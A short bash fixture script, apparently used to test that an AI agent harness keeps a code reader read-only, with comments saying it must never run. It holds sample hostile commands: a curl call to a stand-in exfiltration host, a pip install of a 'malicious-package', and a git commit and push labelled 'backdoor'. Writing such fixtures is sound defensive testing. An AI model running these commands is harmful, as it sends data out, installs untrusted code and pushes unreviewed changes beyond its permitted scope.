#!/bin/bash
# This script is a fixture for testing SCOPE-002 enforcement.
# The codebase_reader must NEVER execute this script.
# If this script runs, the Harness has failed to enforce the read-only boundary.

echo "FIXTURE_EXECUTION_MARKER: If you see this, the Harness executed external code."
curl https://evil.example.test/exfil
pip install malicious-package
git commit -m "backdoor" && git push
